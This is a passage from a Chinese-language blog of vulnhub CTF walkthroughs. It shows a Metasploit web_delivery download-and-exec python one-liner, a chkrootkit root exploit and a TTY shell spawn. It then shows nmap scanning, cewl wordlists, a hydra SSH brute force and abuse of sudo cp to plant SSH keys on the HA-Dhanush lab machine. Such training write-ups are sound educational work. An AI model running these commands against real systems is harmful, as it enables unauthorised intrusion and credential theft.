<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"><span class="comment"># cowsay++</span></span><br><span class="line"> ____________                                                                                          </span><br><span class="line">&lt; metasploit &gt;                                                                                         </span><br><span class="line"> ------------                                                                                          </span><br><span class="line">       \   ,__,                                                                                        </span><br><span class="line">        \  (oo)____                                                                                    </span><br><span class="line">           (__)    )\                                                                                  </span><br><span class="line">              ||--|| *                                                                                 </span><br><span class="line">                                                                                                       </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.63-dev                          ]</span><br><span class="line">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST 192.168.142.128</span><br><span class="line">LHOST =&gt; 192.168.142.128</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.142.128:4444 </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/iG1jsBgk9ZBOAY</span><br><span class="line">[*] Local IP: http://192.168.142.128:8080/iG1jsBgk9ZBOAY</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">python -c <span class="string">&quot;import sys;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#x27;);exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure>

<p>复制漏洞利用程序生成的命令，并在之前获得的ssh会话运行python -c “import sys;u=<strong>import</strong>(‘urllib’+{2:’’,3:’.request’}[sys.version_info[0]],fromlist=(‘urlopen’,));r=u.urlopen(‘<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEyODo4MDgwL2lHMWpzQmdrOVpCT0FZJiMzOTspO2V4ZWMoci5yZWFkKCkpOyZxdW90OyVFMyU4MCU4Mg==">http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#39;);exec(r.read());&quot;。<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ashoka@ubuntu:~$ python -c <span class="string">&quot;import sys;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#x27;);exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure>

<p>这给了需要的session。将使用Metasploit中的内置漏洞利用程序，可以帮助我们在目标计算机上获得root shell。 我们选择了会话并为另一个会话提供了端口。 键入漏洞利用程序后，发现漏洞利用程序正在运行，并且通过前面提到的端口为我们提供了另一个shell为了将shell转换为能够用的shell，运行了python单行代码以生成TTY shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; </span><br><span class="line">[*] 192.168.142.130  web_delivery - Delivering Payload (454) bytes</span><br><span class="line">[*] Sending stage (53755 bytes) to 192.168.142.130</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.142.128:4444 -&gt; 192.168.142.130:38970) at 2019-12-16 01:06:52 -0500</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; use exploit/unix/<span class="built_in">local</span>/chkrootkit</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; <span class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.142.128:8888 </span><br><span class="line">[!] Rooting depends on the crontab (this could take a <span class="keyword">while</span>)</span><br><span class="line">[*] Payload written to /tmp/update</span><br><span class="line">[*] Waiting <span class="keyword">for</span> chkrootkit to run via cron...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> XMnVavzOqVIfxgY5;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;XMnVavzOqVIfxgY5\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 4 opened (192.168.142.128:8888 -&gt; 192.168.142.130:44238) at 2019-12-16 01:09:28 -0500</span><br><span class="line">whoami</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> BGwiPjx0EW1uplK3;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;BGwiPjx0EW1uplK3\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 5 opened (192.168.142.128:8888 -&gt; 192.168.142.130:44242) at 2019-12-16 01:10:28 -0500</span><br><span class="line">[!] Tried to delete /tmp/update, unknown result</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">final.txt</span><br><span class="line"><span class="comment"># cat final.txt</span></span><br><span class="line">cat final.txt</span><br><span class="line">                                                                   </span><br><span class="line">!! Congrats you have finished this task !!</span><br><span class="line"></span><br><span class="line">Contact us here:</span><br><span class="line"></span><br><span class="line">Hacking Articles : https://twitter.com/rajchandel/</span><br><span class="line">Geet Madan : https://in.linkedin.com/<span class="keyword">in</span>/geet-madan</span><br><span class="line"></span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line">____________________________________</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>找到一个文本文件final.txt，将其打开以查找final flag,挑战到此结束,6的一批。</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HA-Dhanush]</title>
    <url>/2019/12/17/HA-Dhanush/</url>
    <content><![CDATA[<p>名称：HA：Dhanush<br>发布日期：2019年11月9日</p>
<p>级别：中级<br>任务：枚举目标计算机并获得root用户访问权限。</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQmZPdnJySXFrVmVlRWh2M2o3eUFTS21WTnctODRzM0wvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1BfOvrrIqkVeeEhv3j7yASKmVNw-84s3L/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9kaGFudXNoLnppcA==">https://download.vulnhub.com/ha/dhanush.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9kaGFudXNoLnppcC50b3JyZW50">https://download.vulnhub.com/ha/dhanush.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>Dhanush曾经是武器技术的巅峰之作。 它把战争重新定义到了一个新的高度，并在历史上的所有神话记载中都提到过。<br>选择你的Dhanush，拉伸琴弦并射击以获取root！枚举是关键！！！！有关印度神话和弓箭的一些信息可能会有所帮助。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.131</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:0C:29:22:66:8B (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.142.131</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span></span><br><span class="line">| http-fileupload-exploiter: </span><br><span class="line">|   </span><br><span class="line">|     Couldn<span class="string">&#x27;t find a file-type field.</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|_    Couldn&#x27;</span>t find a file-type field.</span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.29: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span></span><br><span class="line"><span class="string">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span></span><br><span class="line"><span class="string">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br><span class="line"><span class="string">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span></span><br><span class="line"><span class="string">|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -A 192.168.142.131</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: HA: Dhanush</span><br><span class="line">65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e3:2f:3d:dd:ac:42:d4:d5:de:ec:9b:19:0b:45:3e:13 (RSA)</span><br><span class="line">|   256 89:02:8d:a5:e0:75:a5:34:3b:52:3a:6c:d1:f4:05:da (ECDSA)</span><br><span class="line">|_  256 ea:af:62:07:73:d0:d5:1e:fb:a9:12:62:34:27:52:d9 (ED25519)</span><br></pre></td></tr></table></figure>

<p>现在，在进一步之前，此网页可能包含Dhanush的大量信息。 同样，这些可能是用户名或密码。 因此，决定使用cewl命令制作字典。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cewl http://192.168.142.131/ -w dict1.txt</span></span><br><span class="line">CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">root@kali:~<span class="comment"># cat dict1.txt </span></span><br><span class="line">Dhanush</span><br><span class="line">धनष</span><br><span class="line">Lord</span><br><span class="line">Feature</span><br><span class="line">Wielded</span><br><span class="line">the</span><br><span class="line">यद</span><br><span class="line">यग</span><br><span class="line">Arjuna</span><br><span class="line">was</span><br><span class="line">able</span><br><span class="line">his</span><br><span class="line">and</span><br><span class="line">Then</span><br><span class="line">path</span><br><span class="line">The</span><br><span class="line">Header</span><br><span class="line">लनर</span><br><span class="line">भवत</span><br><span class="line">भरत</span><br><span class="line">यत</span><br><span class="line">थनमधर</span><br><span class="line">तदत</span><br><span class="line">मन</span><br><span class="line">सजम</span><br><span class="line">यहम</span><br><span class="line">परत</span><br><span class="line">रणय</span><br><span class="line">सधन</span><br><span class="line">वनशय</span><br><span class="line">दष</span><br><span class="line">कतम</span><br><span class="line">मसस</span><br><span class="line">थपनर</span><br><span class="line">थय</span><br><span class="line">भवम</span><br><span class="line">What</span><br><span class="line">Banner</span><br><span class="line">Dhanushधनष</span><br><span class="line">Weapon</span><br><span class="line"><span class="keyword">for</span></span><br><span class="line">shooting</span><br><span class="line">arrows</span><br><span class="line">typically</span><br><span class="line">made</span><br><span class="line">curved</span><br><span class="line">piece</span><br><span class="line">wood</span><br><span class="line">joined</span><br><span class="line">both</span><br><span class="line">ends</span><br><span class="line">Taut</span><br><span class="line">String</span><br><span class="line">दनय</span><br><span class="line">सबस</span><br><span class="line">तशल</span><br><span class="line">धनषWorld</span><br><span class="line">Most</span><br><span class="line">Powerful</span><br><span class="line">Dhanushs</span><br><span class="line">Sharang</span><br><span class="line">Dhanushसरग</span><br><span class="line">Vishnu</span><br><span class="line">Made</span><br><span class="line">Viswakarma</span><br><span class="line">Pinak</span><br><span class="line">Dhanushपनक</span><br><span class="line">ShivaMade</span><br><span class="line">pinak</span><br><span class="line">Gandiv</span><br><span class="line">Dhanushगण</span><br><span class="line">डव</span><br><span class="line">ArjunaMade</span><br><span class="line">Brahma</span><br><span class="line">Portfolio</span><br><span class="line">Choose</span><br><span class="line">Yoursअपन</span><br><span class="line">चन</span><br><span class="line">Heat</span><br><span class="line">Mahabharata</span><br><span class="line">not</span><br><span class="line">lift</span><br><span class="line">against</span><br><span class="line">Family</span><br><span class="line">Gurus</span><br><span class="line">Krishna</span><br><span class="line">tells</span><br><span class="line">him</span><br><span class="line">this</span><br><span class="line">Dhram</span><br><span class="line">Eternal</span><br><span class="line">Truth</span><br><span class="line">war</span><br><span class="line">You</span><br><span class="line">CTF</span><br><span class="line">Warrior</span><br><span class="line">Pick</span><br><span class="line">your</span><br><span class="line">attain</span><br><span class="line">Boot</span><br><span class="line">Hacking</span><br><span class="line">Articles</span><br><span class="line">All</span><br><span class="line">rights</span><br><span class="line">reserved</span><br><span class="line">Scripts</span><br><span class="line">Raj</span><br><span class="line">Aarti</span><br><span class="line">Geet</span><br><span class="line">Yashika</span><br><span class="line">Kavish</span><br><span class="line">Rishab</span><br><span class="line">Japneet</span><br><span class="line">Pavan</span><br></pre></td></tr></table></figure>

<h3 id="爆破ssh的用户名和密码"><a href="#爆破ssh的用户名和密码" class="headerlink" title="爆破ssh的用户名和密码"></a>爆破ssh的用户名和密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -L dict1.txt -P dict1.txt ssh://192.168.142.131 -s 65345 -I -e nsr -f</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-17 22:03:33</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 13338 login tries (l:114/p:117), ~834 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.142.131:65345/</span><br><span class="line">[STATUS] 214.00 tries/min, 214 tries <span class="keyword">in</span> 00:01h, 13127 to <span class="keyword">do</span> <span class="keyword">in</span> 01:02h, 16 active</span><br><span class="line">[STATUS] 149.67 tries/min, 449 tries <span class="keyword">in</span> 00:03h, 12892 to <span class="keyword">do</span> <span class="keyword">in</span> 01:27h, 16 active</span><br><span class="line">[STATUS] 154.14 tries/min, 1079 tries <span class="keyword">in</span> 00:07h, 12262 to <span class="keyword">do</span> <span class="keyword">in</span> 01:20h, 16 active</span><br><span class="line">[STATUS] 154.67 tries/min, 2320 tries <span class="keyword">in</span> 00:15h, 11024 to <span class="keyword">do</span> <span class="keyword">in</span> 01:12h, 16 active</span><br><span class="line"></span><br><span class="line">[STATUS] 151.68 tries/min, 4702 tries <span class="keyword">in</span> 00:31h, 8643 to <span class="keyword">do</span> <span class="keyword">in</span> 00:57h, 16 active</span><br><span class="line">[STATUS] 151.43 tries/min, 7117 tries <span class="keyword">in</span> 00:47h, 6229 to <span class="keyword">do</span> <span class="keyword">in</span> 00:42h, 16 active</span><br><span class="line">[65345][ssh] host: 192.168.142.131   login: pinak   password: Gandiv</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.142.131 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-17 22:56:20</span><br></pre></td></tr></table></figure>

<ul>
<li>用户名/密码  ——  pinak/Gandiv</li>
</ul>
<p>现在有了SSH的登录凭据，pinak/Gandiv登录并进行查看。 运行sudo -l命令检查sudoers列表，发现有效的cp命令以sarang用户身份运行，没有任何密码，因此可以使用它。 看一下用户sarang。 在sarang的主目录中，看到一个标记为“ .ssh”的隐藏目录。 试图打开它，但受到限制。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh pinak@192.168.142.131 -p 65345</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.142.131]:65345 ([192.168.142.131]:65345)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.142.131]:65345<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">pinak@192.168.142.131&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">Last login: Fri Nov  8 09:05:56 2019</span><br><span class="line">pinak@ubuntu:~$ id</span><br><span class="line">uid=1001(pinak) gid=1001(pinak) groups=1001(pinak)</span><br><span class="line">pinak@ubuntu:~$ whoami</span><br><span class="line">pinak</span><br><span class="line">pinak@ubuntu:~$ </span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/pinak</span><br><span class="line">pinak@ubuntu:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> pinak on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User pinak may run the following commands on ubuntu:</span><br><span class="line">    (sarang) NOPASSWD: /bin/cp</span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">cd</span> /home/sarang</span><br><span class="line">pinak@ubuntu:/home/sarang$ ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 4 sarang sarang 4096 Nov  8 08:03 .</span><br><span class="line">drwxr-xr-x 5 root   root   4096 Nov  7 21:01 ..</span><br><span class="line">-rw------- 1 sarang sarang    1 Nov  8 09:07 .bash_history</span><br><span class="line">-rw-r--r-- 1 sarang sarang  220 Nov  7 21:01 .bash_logout</span><br><span class="line">-rw-r--r-- 1 sarang sarang 3771 Nov  7 21:01 .bashrc</span><br><span class="line">drwx------ 2 sarang sarang 4096 Nov  7 21:07 .cache</span><br><span class="line">-rw-r--r-- 1 sarang sarang  807 Nov  7 21:01 .profile</span><br><span class="line">drwx------ 2 sarang sarang 4096 Nov  7 21:35 .ssh</span><br><span class="line">pinak@ubuntu:/home/sarang$ <span class="built_in">cd</span> .ssh</span><br><span class="line">-bash: <span class="built_in">cd</span>: .ssh: Permission denied</span><br></pre></td></tr></table></figure>

<p>使用cp命令进入sarang用户。 需要将ssh密钥显示在sarang用户主目录内的.ssh目录中。 尽管该文件只能读取，但可以使用cp命令在该目录中发送密钥。 为此，首先需要生成这些密钥。 为此使用ssh-keygen。 使用ssh-keygen后，进入pinak用户主目录内的.ssh目录中以找到id_rsa公钥。 给它适当的权限。 并将其移动到pinak用户主目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pinak@ubuntu:~$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/pinak/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/pinak/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/pinak/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:M3EjxpbK4Ni6vFhkYjtaUWnV7IRl6gK/2ab8B3FLz+U pinak@ubuntu</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|      .=o        |</span></span><br><span class="line"><span class="string">|     o.++.       |</span></span><br><span class="line"><span class="string">|  . = .oB o      |</span></span><br><span class="line"><span class="string">|   O +.+++ ..    |</span></span><br><span class="line"><span class="string">|..= = ++S+ o     |</span></span><br><span class="line"><span class="string">|.+.o =. .oo E    |</span></span><br><span class="line"><span class="string">| o+ o o.         |</span></span><br><span class="line"><span class="string">|.=.o o  .        |</span></span><br><span class="line"><span class="string">|o +.o...         |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">pinak@ubuntu:~$ cd .ssh</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ ls</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ chmod 777 id_rsa.pub</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ cp id_rsa.pub /home/pinak</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ cd ..</span></span><br><span class="line"><span class="string">pinak@ubuntu:~$ ls</span></span><br><span class="line"><span class="string">id_rsa.pub</span></span><br></pre></td></tr></table></figure>

